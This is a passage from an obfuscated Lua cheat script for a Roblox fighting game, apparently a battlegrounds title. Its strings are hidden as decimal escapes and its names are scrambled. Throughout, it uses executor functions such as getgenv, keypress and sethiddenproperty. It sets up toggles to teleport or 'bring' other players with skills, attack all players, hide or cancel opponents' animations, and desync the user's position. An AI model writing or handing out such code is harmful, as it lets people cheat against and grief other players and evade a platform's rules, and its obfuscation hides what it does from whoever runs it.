 local _IIIIllIIlI = _llIIllIlIl.Animation.AnimationId local _lIIllllIIl = _IIIllIIlIl[_IlIllIIllI.SkillBringArea.Value] local _lIlIllIIIl = _IIlIlIIlIl.SkillBringTPBack.Value local _llIIlIlIll = (_IlIllIIllI.SkillBringArea.Value == "\086\111\105\100") if _IIIIllIIlI:match("\049\050\050\057\054\049\049\051\057\056\054") then local _lIIIlIIIlI = _llIIlIIlII.CFrame game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101"):Create(_llIIlIIlII, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {CFrame = _lIIllllIIl}):Play() if _lIlIllIIIl then local _IIlIIllIIl = tick() repeat task.wait() until not _llIIllIlIl.IsPlaying or tick() - _IIlIIllIIl > 0x8 _llIllllllI(_lIIIlIIIlI) end
 elseif _IIIIllIIlI:match("\049\053\049\052\053\052\054\050\054\056\048") then task.spawn( function () task.wait(1.6) for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll then local _lIlIIlIIll = _IIIIIlIlll.Character local _IlIIIlIIII = _lIlIIlIIll and _lIlIIlIIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IlIIIIIIlI = _lIlIIlIIll and _lIlIIlIIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIIII and _IlIIIIIIlI and (_IlIIIlIIII.Position - _llIIlIIlII.Position).Magnitude <= 0xF and _IlIIIIIIlI.Health <= 0x14 then return end
 end
 end
 local _lIIIlIIIlI = _llIIlIIlII.CFrame local _IIlIIllIIl = tick() repeat _llIllllllI(_lIIllllIIl) task.wait() until tick() >= _IIlIIllIIl + 0.5 if _lIlIllIIIl then repeat task.wait() until not _llIIllIlIl.IsPlaying or tick() - _IIlIIllIIl > 0x8 _llIllllllI(_lIIIlIIIlI) end
 end
 ) elseif _IIIIllIIlI:match("\049\054\049\051\057\049\048\056\055\049\056") then task.spawn( function () local _lIIIlIIIlI = _llIIlIIlII.CFrame if _llIIlIlIll then local _lllIlIlllI = nil local _lIllllIIll = _IlIIlIIlIl.AnimationPlayed:Connect( function (_IIlIllIIlI) if _IIlIllIIlI.Animation.AnimationId:match("\049\054\053\055\049\052\054\049\050\048\050") then _lllIlIlllI = _IIlIllIIlI end
 end
 ) keypress(0x20) repeat task.wait() until not _llIIllIlIl.IsPlaying or _lllIlIlllI keyrelease(0x20) _lIllllIIll:Disconnect() if not _lllIlIlllI then return end
 _llIllllllI(_lIIllllIIl) if _lIlIllIIIl then local _IIlIllIIlI = tick() repeat task.wait() until not _lllIlIlllI.IsPlaying or tick() - _IIlIllIIlI > 0x8 _llIllllllI(_lIIIlIIIlI) end
 return end
 local _IIlIllIllI = workspace.CurrentCamera local _IIlIIIllIl = _IIlIllIllI.CFrame _IIlIllIllI.CameraType = Enum.CameraType.Scriptable getgenv()._cpCamActive = true local _IlIlIlIllI = _IIlIllIllI:GetPropertyChangedSignal("\067\097\109\101\114\097\084\121\112\101"):Connect( function () if _IIlIllIllI.CameraType ~= Enum.CameraType.Scriptable then _IIlIllIllI.CameraType = Enum.CameraType.Scriptable end
 end
 ) RunService:BindToRenderStep("\095\099\112\067\097\109\076\111\099\107", Enum.RenderPriority.Camera.Value + 0x1, function () _IIlIllIllI.CFrame = _IIlIIIllIl end
 ) keypress(0x20) local _lllIlIlllI = nil local _lIllllIIll = _IlIIlIIlIl.AnimationPlayed:Connect( function (_IIlIllIIlI) if not _lllIlIlllI then _lllIlIlllI = _IIlIllIIlI end
 end
 ) local _IIlIIllIIl = tick() repeat _llIllllllI(_lIIllllIIl) task.wait() until _lllIlIlllI or tick() - _IIlIIllIIl > 1.5 _lIllllIIll:Disconnect() keyrelease(0x20) if _lllIlIlllI then local _IIlIllIIlI = tick() repeat task.wait() until not _lllIlIlllI.IsPlaying or tick() - _IIlIllIIlI > 0x6 end
 _IlIlIlIllI:Disconnect() RunService:UnbindFromRenderStep("\095\099\112\067\097\109\076\111\099\107") getgenv()._cpCamActive = false _IIlIllIllI.CameraType = Enum.CameraType.Custom if _lIlIllIIIl then _llIllllllI(_lIIIlIIIlI) end
 end
 ) elseif _IIIIllIIlI:match("\049\056\049\056\050\052\050\053\049\051\051") then task.spawn( function () local _lIIIlIIIlI = _llIIlIIlII.CFrame repeat task.wait() until _llIIllIlIl.TimePosition >= 2.6 or not _llIIllIlIl.IsPlaying if not _llIIllIlIl.IsPlaying then return end
 _llIllllllI(_lIIllllIIl) if _lIlIllIIIl then repeat task.wait() until not _llIIllIlIl.IsPlaying _llIllllllI(_lIIIlIIIlI) end
 end
 ) elseif _IIIIllIIlI:match("\057\052\054\051\056\051\053\054\048\048\056\054\057\054") then task.spawn( function () local _lIIIlIIIlI = _llIIlIIlII.CFrame repeat task.wait() until _llIIllIlIl.TimePosition >= 1.50 or not _llIIllIlIl.IsPlaying if not _llIIllIlIl.IsPlaying then return end
 repeat _llIllllllI(_lIIllllIIl) task.wait() until not _llIIllIlIl.IsPlaying if _lIlIllIIIl then _llIllllllI(_lIIIlIIIlI) end
 end
 ) elseif _IIIIllIIlI:match("\057\053\048\051\052\048\056\051\050\048\054\050\057\050") then task.spawn( function () local _lIIIlIIIlI = _llIIlIIlII.CFrame repeat task.wait() until _llIIllIlIl.TimePosition >= 1.7 or not _llIIllIlIl.IsPlaying if not _llIIllIlIl.IsPlaying then return end
 _llIllllllI(_lIIllllIIl) if _lIlIllIIIl then repeat task.wait() until not _llIIllIlIl.IsPlaying _llIllllllI(_lIIIlIIIlI) end
 end
 ) elseif _IIIIllIIlI:match("\049\049\053\052\056\052\054\057\048\053\055\050\056\056\048") then task.spawn( function () local _lIIIlIIIlI = _llIIlIIlII.CFrame repeat task.wait() until _llIIllIlIl.TimePosition >= 0x1 or not _llIIllIlIl.IsPlaying if not _llIIllIlIl.IsPlaying then return end
 _llIllllllI(_lIIllllIIl) if _lIlIllIIIl then repeat task.wait() until not _llIIllIlIl.IsPlaying _llIllllllI(_lIIIlIIIlI) end
 end
 ) elseif _IIIIllIIlI:match("\049\054\053\055\049\052\054\049\050\048\050") then task.spawn( function () local _lIIIlIIIlI = _llIIlIIlII.CFrame _llIllllllI(_lIIllllIIl) local _IIlIIllIIl = tick() repeat task.wait() until not _llIIllIlIl.IsPlaying or tick() - _IIlIIllIIl > 0x8 if _lIlIllIIIl then _llIllllllI(_lIIIlIIIlI) end
 end
 ) end
 end
 ) end
 _IIlllIlIIl(_llIIIlIIll.Character) _IIllIllIlI = _llIIIlIIll.CharacterAdded:Connect( function (_IIllllIlII) task.wait(0.1) _IIlllIlIIl(_IIllllIlII) end
 ) local _lIlIIIlIll = {"\114\098\120\097\115\115\101\116\105\100\058\047\047\049\050\051\053\049\056\053\052\053\053\054","\114\098\120\097\115\115\101\116\105\100\058\047\047\049\053\051\049\049\054\056\053\054\050\056","\114\098\120\097\115\115\101\116\105\100\058\047\047\049\053\049\050\056\056\052\057\048\052\055"} local _llllIIIlII = {"\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\054\048\051\051\057\054\057\051\057","\114\098\120\097\115\115\101\116\105\100\058\047\047\049\053\051\051\052\057\055\052\053\053\048","\114\098\120\097\115\115\101\116\105\100\058\047\047\049\053\049\050\051\054\054\053\052\057\049"} local _IIlllIIIlI = {"\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\052\055\048\051\056\057\056\050\055","\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\051\056\048\055\055\056\049\057\051","\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\057\051\053\053\052\056\053\053\050"} local _IlIllIIlll = {} local function _IlIlllIIll(_IIllllIlII) if not _IIllllIlII then return end
 local _IlIIIlIIII = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100", 0x3) local _llIIlIIlII = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116", 0x3) if not _IlIIIlIIII or not _llIIlIIlII then return end
 table.insert(_IlIllIIlll, _IIllllIlII:GetAttributeChangedSignal("\066\108\111\099\107\105\110\103"):Connect( function () if _IIllllIlII:GetAttribute("\066\108\111\099\107\105\110\103") and _IIlIlIIlIl.InvisibleMoves_Block.Value then _IIllllIlII:SetAttribute("\066\108\111\099\107\105\110\103", false) end
 end
 )) table.insert(_IlIllIIlll, _IlIIIlIIII.AnimationPlayed:Connect( function (_llIIllIlIl) local _IIIIllIIlI = _llIIllIlIl.Animation.AnimationId if _IIIIllIIlI:match("\049\049\051\054\053\053\054\051\050\053\053") and rawget(_IlIllIIllI.InvisibleMoves_Saitama.Value, "\073\110\118\105\115\105\098\108\101\032\084\097\098\108\101\032\070\108\105\112") then _llIIllIlIl:Stop() task.delay(0x3, function () _IlIIIlIIII.HipHeight = 0xA task.wait(0.75) _IlIIIlIIII.HipHeight = 0x0 end
 ) elseif _IIIIllIIlI:match("\049\050\057\056\051\051\051\051\055\051\051") then if rawget(_IlIllIIllI.InvisibleMoves_Saitama.Value, "\073\110\118\105\115\105\098\108\101\032\083\101\114\105\111\117\115\032\080\117\110\099\104") then _llIIllIlIl:Stop() end
 elseif _IIIIllIIlI:match("\049\051\057\050\055\054\049\050\057\053\049") and rawget(_IlIllIIllI.InvisibleMoves_Saitama.Value, "\073\110\118\105\115\105\098\108\101\032\079\109\110\105\045\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\050\052\052\055\055\048\055\056\052\052") and rawget(_IlIllIIllI.InvisibleMoves_Saitama.Value, "\073\110\118\105\115\105\098\108\101\032\085\108\116") then _llIIllIlIl:Stop() local _lIIlIIIllI = tick() repeat getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } task.wait() until tick() >= _lIIlIIIllI + 0x1 getgenv().desync = nil elseif _IIIIllIIlI:match("\049\050\051\052\050\049\052\049\052\054\052") and rawget(_IlIllIIllI.InvisibleMoves_Garou.Value, "\073\110\118\105\115\105\098\108\101\032\085\108\116") then _llIIllIlIl:Stop() elseif (_IIIIllIIlI == "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\052\057\057\055\055\049\056\051\054" or _IIIIllIIlI == "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\052\057\055\056\055\053\048\052\057") and rawget(_IlIllIIllI.InvisibleMoves_Sonic.Value, "\073\110\118\105\115\105\098\108\101\032\085\108\116") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\050\055\055\050\053\052\051\050\057\051") and rawget(_IlIllIIllI.InvisibleMoves_Genos.Value, "\073\110\118\105\115\105\098\108\101\032\085\108\116") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\051\049\052\054\055\049\048\055\054\050") and rawget(_IlIllIIllI.InvisibleMoves_Genos.Value, "\073\110\118\105\115\105\098\108\101\032\073\110\099\105\110\101\114\097\116\101") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\053\049\052\053\052\054\050\054\056\048") and rawget(_IlIllIIllI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\065\116\109\111\115\032\067\108\101\097\118\101") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\053\051\057\049\051\050\051\052\052\049") and rawget(_IlIllIIllI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\085\108\116") then _llIIllIlIl:Stop() elseif (_IIIIllIIlI:match("\049\054\049\051\057\049\048\056\055\049\056") or _IIIIllIIlI:match("\049\054\049\051\057\055\048\056\055\050\055") or _IIIIllIIlI:match("\049\054\049\051\057\052\048\050\053\056\050")) and rawget(_IlIllIIllI.InvisibleMoves_Tatsumaki.Value, "\073\110\118\105\115\105\098\108\101\032\067\114\117\115\104\105\110\103\032\080\117\108\108") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\054\053\049\053\056\053\048\049\053\051") and rawget(_IlIllIIllI.InvisibleMoves_Tatsumaki.Value, "\073\110\118\105\115\105\098\108\101\032\087\105\110\100\115\116\111\114\109\032\070\117\114\121") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\054\052\051\049\052\057\049\050\049\053") and rawget(_IlIllIIllI.InvisibleMoves_Tatsumaki.Value, "\073\110\118\105\115\105\098\108\101\032\083\116\111\110\101\032\071\114\097\118\101") then _llIIllIlIl:Stop() elseif (_IIIIllIIlI:match("\049\054\053\057\055\051\050\050\051\057\056") or _IIIIllIIlI:match("\049\054\053\057\055\057\049\050\048\056\054")) and rawget(_IlIllIIllI.InvisibleMoves_Tatsumaki.Value, "\073\110\118\105\115\105\098\108\101\032\069\120\112\117\108\115\105\118\101\032\080\117\115\104") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\054\055\051\052\053\056\052\052\055\056") and rawget(_IlIllIIllI.InvisibleMoves_Tatsumaki.Value, "\073\110\118\105\115\105\098\108\101\032\085\108\116") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\053\053\050\048\049\051\050\050\051\051") and rawget(_IlIllIIllI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\083\117\110\115\101\116") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\053\054\055\054\048\055\050\052\054\057") and rawget(_IlIllIIllI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\083\111\108\097\114\032\067\108\101\097\118\101") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\054\048\054\050\052\049\048\056\048\057") and rawget(_IlIllIIllI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\083\117\110\114\105\115\101") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\054\048\054\050\055\049\050\057\052\056") and rawget(_IlIllIIllI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\083\117\110\114\105\115\101\032\070\105\110\105\115\104\101\114") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\054\048\056\050\049\050\051\055\049\050") and rawget(_IlIllIIllI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\065\116\111\109\105\099\032\083\108\097\115\104") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\054\048\053\055\052\049\049\056\056\056") and rawget(_IlIllIIllI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\065\116\111\109\105\099\032\083\108\097\115\104\032\070\105\110\105\115\104\101\114") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\055\055\057\057\050\050\052\056\054\054") and rawget(_IlIllIIllI.InvisibleMoves_Suiryu.Value, "\066\117\108\108\101\116\032\066\097\114\114\097\103\101") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\055\050\055\053\049\053\048\056\048\057") and rawget(_IlIllIIllI.InvisibleMoves_Tatsumaki.Value, "\073\110\118\105\115\105\098\108\101\032\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111") then _llIIllIlIl:Stop() elseif _IIIIllIIlI:match("\049\055\050\055\056\052\049\053\056\053\051") and rawget(_IlIllIIllI.InvisibleMoves_Tatsumaki.Value, "\073\110\118\105\115\105\098\108\101\032\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111\032\070\105\110\105\115\104\101\114") then _llIIllIlIl:Stop() elseif table.find(_lIlIIIlIll, _IIIIllIIlI) and _IIlIlIIlIl.InvisibleMoves_Counter.Value then _llIIllIlIl:AdjustWeight(-0xF423F) elseif table.find(_llllIIIlII, _IIIIllIIlI) and _IIlIlIIlIl.InvisibleMoves_CounterHit.Value then _llIIllIlIl:Stop() elseif table.find(_IIlllIIIlI, _IIIIllIIlI) and _IIlIlIIlIl.InvisibleMoves_Block.Value then _llIIllIlIl:AdjustWeight(-0xF423F) local _IlllIIlllI = _IIllllIlII:FindFirstChild("\069\115\112\101\114\083\104\105\101\108\100", true) if _IlllIIlllI then for _lllIlllIIl, pe in pairs(_IlllIIlllI:GetDescendants()) do if pe:IsA("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114") and not pe.Name:find("\073\109\112\097\099\116") then task.spawn( function () local _IIlllIlllI, origColor = pe.Rate, pe.Color pe.Rate = 0x2D if _IIlIlIIlIl.InvisibleMoves_BlockColor.Value then pe.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0x0, _IlIllIIllI.InvisibleMoves_BlockColor1.Value), ColorSequenceKeypoint.new(0.5, _IlIllIIllI.InvisibleMoves_BlockColor2.Value), ColorSequenceKeypoint.new(0x1, _IlIllIIllI.InvisibleMoves_BlockColor3.Value), }) end
 pe.Enabled = true repeat RunService.RenderStepped:Wait() until not _llIIllIlIl.IsPlaying pe.Enabled = false pe.Rate = _IIlllIlllI if _IIlIlIIlIl.InvisibleMoves_BlockColor.Value then pe.Color = origColor end
 end
 ) end
 end
 end
 end
 end
 )) end
 _IlIlllIIll(_llIIIlIIll.Character) local _llIllIIIII = _llIIIlIIll.CharacterAdded:Connect( function (_IIllllIlII) task.wait(0.1) _IlIlllIIll(_IIllllIlII) end
 ) table.insert(_llIlllIlIl, function () if _llIllIIIII then _llIllIIIII:Disconnect() _llIllIIIII = nil end
 for _lllIlllIIl, _IllIIIllII in ipairs(_IlIllIIlll) do pcall( function () _IllIIIllII:Disconnect() end
 ) end
 table.clear(_IlIllIIlll) pcall( function () _IIlIlIIlIl.InvisibleMoves_Block:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.InvisibleMoves_BlockColor:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.InvisibleMoves_Counter:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.InvisibleMoves_CounterHit:SetValue(false) end
 ) end
 ) table.insert(_llIlllIlIl, function () if _IIllIllIlI then _IIllIllIlI:Disconnect() _IIllIllIlI = nil end
 pcall( function () _IIlIlIIlIl.SkillBring:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.SkillBringTPBack:SetValue(false) end
 ) end
 ) local _IIIIIIIlIl = _IlllIIIllI _IIIIIIIlIl:AddToggle("\083\107\105\108\108\066\114\105\110\103", { Text = "\083\107\105\108\108\032\066\114\105\110\103", Default = false, }) _IIIIIIIlIl:AddToggle("\083\107\105\108\108\066\114\105\110\103\084\080\066\097\099\107", { Text = "\084\101\108\101\112\111\114\116\032\066\097\099\107", Default = false, }) _IIIIIIIlIl:AddDropdown("\083\107\105\108\108\066\114\105\110\103\065\114\101\097", { Text = "\083\107\105\108\108\032\066\114\105\110\103\032\065\114\101\097", Values = _lIIllIIlIl, Multi = false, Default = table.find(_lIIllIIlIl, "\068\101\097\116\104\032\067\111\117\110\116\101\114"), Searchable = true, }) _IIIIIIIlIl:AddButton({ Text = "\084\101\108\101\112\111\114\116\032\084\111\032\065\114\101\097", Func = function () local _IIIIllllII = _IIIllIIlIl[_IlIllIIllI.SkillBringArea.Value] if not _IIIIllllII then return end
 local _IIllllIlII = _llIIIlIIll.Character local _llIIlIIlII = _IIllllIlII and _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIllllIlII and _llIIlIIlII then _IIIlIlllll = _llIIlIIlII.CFrame end
 _llIllllllI(_IIIIllllII) end
 , }) _IIIIIIIlIl:AddButton({ Text = "\084\101\108\101\112\111\114\116\032\066\097\099\107", Func = function () _llIllllllI(_IIIlIlllll) end
 , }) _IlllIIIllI:AddDivider() local _lIlIIlllII = _IlllIIIllI _lIlIIlllII:AddToggle("\065\116\116\097\099\107\065\108\108", { Text = "\065\116\116\097\099\107\032\065\108\108", Default = false, }) _lIlIIlllII:AddDropdown("\065\116\116\097\099\107\065\108\108\077\111\118\101\115", { Text = "\077\111\118\101\115", Values = { "\083\097\118\097\103\101\032\084\111\114\110\097\100\111", "\066\114\117\116\097\108\032\066\101\097\116\100\111\119\110", "\067\114\117\115\104\101\100\032\082\111\099\107\032\086\097\114\105\097\110\116", "\084\119\105\110\032\070\097\110\103\115", }, Multi = true, Default = {}, Searchable = false, }) _IlllIIIllI:AddDivider() _lIlIIlllII:AddToggle("\083\107\105\108\108\084\104\114\111\119", { Text = "\083\107\105\108\108\032\084\104\114\111\119", Default = false, }) _lIlIIlllII:AddDropdown("\083\107\105\108\108\084\104\114\111\119\077\111\118\101\115", { Values = { "\072\117\110\116\101\114\115\032\071\114\097\115\112", "\072\111\109\101\114\117\110", }, Multi = true, Default = {}, }) _IlllIIIllI:AddDivider() _lIlIIlllII:AddToggle("\078\111\066\080\095\087\105\110\100\115\116\111\114\109\070\117\114\121", { Text = "\078\111\032\087\105\110\100\115\116\111\114\109\032\070\117\114\121\032\066\080", Default = false, }) _lIlIIlllII:AddToggle("\078\111\066\080\095\084\097\116\115\117\109\097\107\105\085\108\116", { Text = "\078\111\032\084\097\116\115\117\109\097\107\105\032\085\108\116\032\066\080", Default = false, }) _lIlIIlllII:AddToggle("\078\111\066\080\095\080\114\101\121\115\080\101\114\105\108", { Text = "\078\111\032\080\114\101\121\039\115\032\080\101\114\105\108\032\066\080", Default = false, }) table.insert(_llIlllIlIl, function () pcall( function () _IIlIlIIlIl.AttackAll:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.SkillThrow:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.NoBP_WindstormFury:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.NoBP_TatsumakiUlt:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.NoBP_PreysPeril:SetValue(false) end
 ) end
 ) end
 task.spawn( function () local _lllIlIlIll, _featErr = xpcall( function () do local _lIlIlIIIIl = _llIIIlIIll:GetMouse() local _lIIlIIlllI = game:GetService("\083\116\097\116\115") local _IllIIllIII = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101") local _lIllIIIlIl= game:GetService("\068\101\098\114\105\115") _IlIIlIllIl = { Flying = false, ["\084\111\117\099\104\032\070\108\105\110\103"] = false, ["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(0x0, 0x0, 0x0), ["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] = false, } _lIllIlllll = { Fly = false, ["\076\111\099\107\045\111\110"] = false, ["\084\111\117\099\104\032\070\108\105\110\103"]= false, } local _lIlIIIIIll = {} local _llIIllllIl = {} local _IIllIIIlII = nil local _lIIIIlIlII = {} local function _llIlIlIlIl(_IIIIIlIlll) if typeof(_IIIIIlIlll) == "\073\110\115\116\097\110\099\101" then if _IIIIIlIlll:IsA("\080\108\097\121\101\114") then return _IIIIIlIlll.Character elseif _IIIIIlIlll:IsA("\077\111\100\101\108") then return _IIIIIlIlll end
 end
 return nil end
 local function _llIlIlllII(_IIIlIlllll) return _IIIlIlllll and _IIIlIlllll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or nil end
 local function _lIllIlIIlI(_IIIlIlllll) return _IIIlIlllll and _IIIlIlllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or nil end
 local function _llIIIlllII() local _IIlIIIllII = Players:GetPlayers() local _lIllIIIIII = table.find(_IIlIIIllII, _llIIIlIIll) if _lIllIIIIII then table.remove(_IIlIIIllII, _lIllIIIIII) end
 return _IIlIIIllII end
 local function _IIIIIlIlII(_IlIIIlIIII, _IIIIllIIlI) if not _IlIIIlIIII then return false end
 for _lllIlllIIl, _IIlIIllIIl in pairs(_IlIIIlIIII:GetPlayingAnimationTracks()) do if _IIlIIllIIl.Animation.AnimationId:match(_IIIIllIIlI) then return true end
 end
 return false end
 local function _lllIIIllII(_IIIIllllII) local _IIllllIlII = _llIlIlIlIl(_llIIIlIIll) local _llIIlIIlII = _IIllllIlII and _llIlIlllII(_IIllllIlII) if _IIllllIlII and _llIIlIIlII then task.spawn( function () RunService.RenderStepped:Once( function () _llIIlIIlII.Velocity = Vector3.new() RunService.Heartbeat:Wait() _llIIlIIlII.Velocity = Vector3.new() end
 ) end
 ) RunService.Heartbeat:Once( function () _lllIIIllII(_IIIIllllII) end
 ) end
 end
 local function _lIIlIIllII(skipDeathBlow) local _IIlIIIllIl = _llIIIlllII() if #_IIlIIIllIl == 0x0 then return end
 local _lllIIIIlII = {} for _lllIlllIIl, _IIIIIlIlll in ipairs(_IIlIIIllIl) do if not table.find(RevenantWhitelist, _IIIIIlIlll) then table.insert(_lllIIIIlII, _IIIIIlIlll) end
 end
 if #_lllIIIIlII == 0x0 then return end
 local _IIIlIlIIll = _lllIIIIlII[math.random(0x1, #_lllIIIIlII)] if _IIIlIlIIll == _llIIIlIIll then return end
 local _lIIllIIllI = _llIlIlIlIl(_llIIIlIIll) local _IIIlIIIllI = _lIIllIIllI and _llIlIlllII(_lIIllIIllI) local _IlIIIlIIll = _llIlIlIlIl(_IIIlIlIIll) local _lIllIIlIlI = _IlIIIlIIll and _llIlIlllII(_IlIIIlIIll) local _IllIlIIIlI = _IlIIIlIIll and _lIllIlIIlI(_IlIIIlIIll) if not (_lIIllIIllI and _IIIlIIIllI and _IlIIIlIIll and _lIllIIlIlI and _IllIlIIIlI) then return end
 if skipDeathBlow then if _IlIIIlIIll:GetAttribute("\085\108\116\101\100") and _IlIIIlIIll:GetAttribute("\067\104\097\114\097\099\116\101\114") == "\066\097\116\116\101\114" then return end
 for _lllIlllIIl, obj in pairs(_IlIIIlIIll:GetChildren()) do if obj:IsA("\084\111\111\108") and obj.Name == "\068\101\097\116\104\032\066\108\111\119" then return end
 end
 if _IIIIIlIlII(_IllIlIIIlI, "\049\053\049\050\056\056\052\057\048\052\055") then return end
 for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll and _IIIIIlIlll ~= _IIIlIlIIll then local _lIlIIIIlII = _llIlIlIlIl(_IIIIIlIlll) local _llllIIlllI = _lIlIIIIlII and _llIlIlllII(_lIlIIIIlII) local _IIlIllIIlI = _lIlIIIIlII and _lIllIlIIlI(_lIlIIIIlII) if _lIlIIIIlII and _llllIIlllI and _IIlIllIIlI and (_llllIIlllI.Position - _lIllIIlIlI.Position).Magnitude <= 0x64 then if _lIlIIIIlII:GetAttribute("\085\108\116\101\100") and _lIlIIIIlII:GetAttribute("\067\104\097\114\097\099\116\101\114") == "\066\097\116\116\101\114" then return end
 for _lllIlllIIl, obj in pairs(_lIlIIIIlII:GetChildren()) do if obj:IsA("\084\111\111\108") and obj.Name == "\068\101\097\116\104\032\066\108\111\119" then return end
 end
 if _IIIIIlIlII(_IIlIllIIlI, "\049\053\049\050\056\056\052\057\048\052\055") then return end
 end
 end
 end
 end
 if typeof(sethiddenproperty) == "\102\117\110\099\116\105\111\110" then pcall(sethiddenproperty, _IIIlIIIllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _lIllIIlIlI) pcall(sethiddenproperty, _lIllIIlIlI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIIlIIIllI) end
 RunService.Heartbeat:Once( function () _IIIlIIIllI.CFrame = _lIllIIlIlI.CFrame end
 ) task.wait() RunService.Heartbeat:Once( function () _IIIlIIIllI.CFrame = CFrame.lookAt(_IIIlIIIllI.Position, _lIllIIlIlI.Position) end
 ) end
 local function _lIllllIlIl(targetCFrame) local _IIIIIIIlII = _llIlIlIlIl(_llIIIlIIll) local _IlIllIIllI = _IIIIIIIlII and _llIlIlllII(_IIIIIIIlII) or _IIIIIIIlII if _IIIIIIIlII and _IlIllIIllI then task.spawn( function () RunService.RenderStepped:Once( function () _IlIllIIllI.Velocity = Vector3.new() RunService.Heartbeat:Wait() _IlIllIIllI.Velocity = Vector3.new() end
 ) end
 ) RunService.Heartbeat:Once( function () RunService.Heartbeat:Once( function () _IlIllIIllI.CFrame = targetCFrame end
 ) end
 ) end
 end
 local function _lIllIIIIII(animParent, _IlllIllIII, animPriority) if not (animParent and _IlllIllIII) then return nil end
 local _lIlIIIIIII = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. tostring(_IlllIllIII):match("\037\100\043") local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") local _IllllIllII = nil if animPriority then if animPriority == "\083\101\114\118\101\114" then _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\048\057\051\051\053\055\056\056\057\057\048\052\050" _IllllIllII = animParent:LoadAnimation(_llllIlIllI) _llllIlIllI.AnimationId = _lIlIIIIIII elseif animPriority == "\067\108\105\101\110\116" then _llllIlIllI.AnimationId = _lIlIIIIIII _IllllIllII = animParent:LoadAnimation(_llllIlIllI) _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\048\057\051\051\053\055\056\056\057\057\048\052\050" end
 else _llllIlIllI.AnimationId = _lIlIIIIIII _IllllIllII = animParent:LoadAnimation(_llllIlIllI) end
 return _IllllIllII end
 local function _lIllIlllII(soundParent, soundId) if not (soundParent and soundId) then return nil end
 local _llIIlIIIlI = Instance.new("\083\111\117\110\100") _llIIlIIIlI.Parent = soundParent _llIIlIIIlI.SoundId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. tostring(soundId):match("\037\100\043") return _llIIlIIIlI end
